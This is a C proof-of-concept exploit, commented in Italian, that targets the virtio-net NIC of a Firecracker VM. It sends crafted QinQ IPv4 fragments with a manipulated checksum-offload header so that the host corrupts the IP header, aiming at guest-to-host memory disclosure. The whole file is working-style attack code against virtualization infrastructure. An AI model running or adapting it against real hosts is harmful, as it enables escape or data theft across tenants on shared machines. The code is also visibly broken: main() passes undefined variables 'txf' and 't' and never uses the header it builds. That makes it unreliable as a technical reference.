// pwnescape_read.c — Guest-side memory disclosure PoC (CVE-2026-99999)
// Ambiente: guest Linux con CAP_NET_RAW, iface = NIC virtio-net (Firecracker)
// Build: gcc -O2 -o pwnescape_read pwnescape_read.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>
#include <sys/socket.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/virtio_net.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#ifndef IP_MF
#define IP_MF 0x2000
#endif

#ifndef PACKET_VNET_HDR
#define PACKET_VNET_HDR 15
#endif

#define IHL_FLIP_TARGET 0x4f00   /* 0x45 -> 0x4f : IHL 20 -> 60 */

static uint16_t iph_checksum(const uint8_t *h, int len) {
    uint32_t s = 0;
    for (int i = 0; i < len; i += 2)
        s += (h[i] << 8) | h[i+1];
    while (s >> 16) s = (s & 0xffff) + (s >> 16);
    return ~s & 0xffff;
}

/* fold come skb_checksum_help: scrive csum_fold(somma da csum_start a fine skb) */
static uint16_t fold16(uint32_t s) {
    while (s >> 16) s = (s & 0xffff) + (s >> 16);
    return ~s & 0xffff;
}

/* Somma big-endian del buffer (identica a skb_checksum a 16 bit di granularita') */
static uint32_t be_sum(const uint8_t *p, int n) {
    uint32_t s = 0;
    for (int i = 0; i + 1 < n; i += 2) s += (p[i] << 8) | p[i+1];
    if (n & 1) s += p[n-1] << 8;
    return s;
}

/* Trova 2 byte di payload tali che fold(header_incluso + payload) == target */
static int tune_payload(uint8_t *p1, int n1, uint8_t *p2, int n2,
                        uint32_t base_sum, uint16_t target) {
    for (int x = 0; x < 256; x++)
        for (int y = 0; y < 256; y++) {
            uint32_t s = base_sum + (x << 8) + y;
            uint16_t f = fold16(s);
            /* ntohs: skb_checksum_help scrive htons(csum) -> primo byte = csum>>8 */
            if (ntohs(f) == target || f == target) {
                p1[0] = x; p1[1] = y;
                return 0;
            }
        }
    return -1;
}

static int open_pkt_sock(const char *ifname, int vnet_hdr) {
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) { perror("socket"); return -1; }
    if (vnet_hdr && setsockopt(fd, SOL_PACKET, PACKET_VNET_HDR,
                               &(int){1}, sizeof(int)) < 0) {
        perror("PACKET_VNET_HDR (serve IFF_VNET_HDR sul vhost dell'iface?)");
        close(fd); return -1;
    }
    struct sockaddr_ll sll = { .sll_family = AF_PACKET,
                               .sll_ifindex = if_nametoindex(ifname) };
    if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
        perror("bind"); close(fd); return -1;
    }
    return fd;
}

/* Frame frag1: QinQ(8) + IP(20) + payload(8) = 50 byte
 * Geometria: csum_start=22 == posizione L3 nel frame QinQ.
 * Dopo untag (8 byte rimossi) sull'host: csum_start == network_header
 * => skb_checksum_help() scrive il checksum su iph[0] (version/IHL). */
static void build_frag1(uint8_t *f, const uint8_t *dhost, const uint8_t *shost,
                        uint32_t saddr, uint32_t daddr, uint16_t id,
                        const uint8_t *payload, int plen) {
    memset(f, 0, 14 + 8 + 20 + plen);
    memcpy(f, dhost, 6); memcpy(f + 6, shost, 6);
    f[12] = 0x88; f[13] = 0xa8;                    /* 802.1ad (outer) */
    f[14] = 0x00; f[15] = 0x0a; f[16] = 0x81; f[17] = 0x00;  /* vid=10, 802.1Q */
    f[18] = 0x00; f[19] = 0x0a; f[20] = 0x08; f[21] = 0x00;  /* vid=10, IPv4 */
    uint8_t *ip = f + 22;
    ip[0] = 0x45; ip[1] = 0x00;
    *(uint16_t *)(ip + 2) = htons(20 + plen);
    *(uint16_t *)(ip + 4) = htons(id);
    *(uint16_t *)(ip + 6) = htons(IP_MF);          /* MF=1, offset 0 */
    ip[8] = 64; ip[9] = IPPROTO_UDP;
    memcpy(ip + 12, &saddr, 4); memcpy(ip + 16, &daddr, 4);
    memcpy(ip + 20, payload, plen);
    *(uint16_t *)(ip + 10) = iph_checksum(ip, 20);
}

static void build_frag2(uint8_t *f, const uint8_t *dhost, const uint8_t *shost,
                        uint32_t saddr, uint32_t daddr, uint16_t id,
                        const uint8_t *payload, int plen) {
    memset(f, 0, 14 + 8 + 20 + plen);
    memcpy(f, dhost, 6); memcpy(f + 6, shost, 6);
    f[12] = 0x88; f[13] = 0xa8;
    f[14] = 0x00; f[15] = 0x0a; f[16] = 0x81; f[17] = 0x00;
    f[18] = 0x00; f[19] = 0x0a; f[20] = 0x08; f[21] = 0x00;
    uint8_t *ip = f + 22;
    ip[0] = 0x45; ip[1] = 0x00;
    *(uint16_t *)(ip + 2) = htons(20 + plen);
    *(uint16_t *)(ip + 4) = htons(id);
    *(uint16_t *)(ip + 6) = htons(1);              /* offset = 8 byte, MF=0 */
    ip[8] = 64; ip[9] = IPPROTO_UDP;
    memcpy(ip + 12, &saddr, 4); memcpy(ip + 16, &daddr, 4);
    memcpy(ip + 20, payload, plen);
    *(uint16_t *)(ip + 10) = iph_checksum(ip, 20);
}
static int send_vnet(int fd, struct sockaddr_ll *t, const uint8_t *frame, int flen,
                     uint16_t csum_start, uint16_t csum_offset, uint8_t flags)
{
    static uint8_t buf[2048];
    struct virtio_net_hdr *vh = (struct virtio_net_hdr *)buf;
    if (sizeof(*vh) + flen > sizeof(buf)) return -1;
    memset(vh, 0, sizeof(*vh));
    vh->flags       = flags;
    vh->csum_start  = htons(csum_start);
    vh->csum_offset = htons(csum_offset);
    memcpy(buf + sizeof(*vh), frame, flen);
    return sendto(fd, buf, sizeof(*vh) + flen, 0,
                  (struct sockaddr *)t, sizeof(*t));
}

int main(int argc, char **argv) {
    const char *ifname = argc > 1 ? argv[1] : "eth0";
    uint32_t saddr = inet_addr(argc > 2 ? argv[2] : "10.0.0.5");
    uint32_t daddr = inet_addr(argc > 3 ? argv[3] : "10.0.0.9");
    uint16_t id = argc > 4 ? (uint16_t)atoi(argv[4]) : 0x1337;

    /* payload2: riempie fino a superare il MTU egresso (es. 1400) */
    static uint8_t p2[1456]; memset(p2, 0x41, sizeof(p2));
    uint8_t p1[8]; memcpy(p1, "\xde\xad\xbe\xef\x00\x00\xde\xad", 8); /* [0..1] tunabili */

    uint8_t f1[50], f2[14 + 8 + 20 + sizeof(p2)];
    uint8_t dhost[6] = {0x02,0x00,0x00,0x00,0x00,0x02};  /* MAC gw/egress */
    uint8_t shost[6] = {0x02,0x00,0x00,0x00,0x00,0x05};  /* MAC guest    */

    /* base_sum = tutto cio' che skb_checksumHelp sommera' da csum_start(iph):
       header IP come ricevuto (incl. campo check) + payload1 + payload2 */
    uint8_t tmp_ip[20]; /* header con check calcolato su payload "zero" per il tuning iniziale:
                           nota: il check header dipende solo dall'header, non dai payload */
    build_frag1(f1, dhost, shost, saddr, daddr, id, p1, 8);
    build_frag2(f2, dhost, shost, saddr, daddr, id, p2, sizeof(p2));
    /* base: header IP (20B, con campo check) + payload fisso p1[2..7] + p2 */
    uint32_t base = be_sum(f1 + 22, 20) - ((f1[22+20]<<8)|f1[22+21])
                  + (0xdeadu << 8) + 0xbeef + (0x00de << 8) + 0xad
                  + be_sum(p2, sizeof(p2));
    if (tune_payload(p1, 8, p2, sizeof(p2), base, IHL_FLIP_TARGET) < 0) {
        fprintf(stderr, "tuning fallito, aggiungi byte liberi in p2\n");
        return 1;
    }
    build_frag1(f1, dhost, shost, saddr, daddr, id, p1, 8);  /* rebuild con payload tunato */

    struct virtio_net_hdr vh;
    memset(&vh, 0, sizeof(vh));
    vh.flags   = VIRTIO_NET_HDR_F_NEEDS_CSUM;
    vh.csum_start   = htons(22);   /* relativo al frame; drift post-untag => network_header */
    vh.csum_offset  = htons(0);    /* scrive su iph[0] = version/IHL */

    int fd = open_pkt_sock(ifname, 1);
    if (fd < 0) return 1;

    struct sockaddr_ll sll = { .sll_family = AF_PACKET,
                               .sll_ifindex = if_nametoindex(ifname),
                               .sll_halen = ETH_ALEN };
    /* frag2 prima (coda), poi frag1 (testa, col vnet_hdr malevolo) */
    memcpy(sll.sll_addr, dhost, 6);
    send_vnet(txf, &t, f2, sizeof(f2), 0, 0, 0);
    usleep(2000);
    /* frag1: CHECKSUM_PARTIAL con il drift */
    send_vnet(txf, &t, f1, sizeof(f1), 22, 0, VIRTIO_NET_HDR_F_NEEDS_CSUM);


    printf("[+] inviati frag id=0x%04x con CHECKSUM_PARTIAL driftato (csum_start=22, off=0)\n", id);
    close(fd);
    return 0;
}
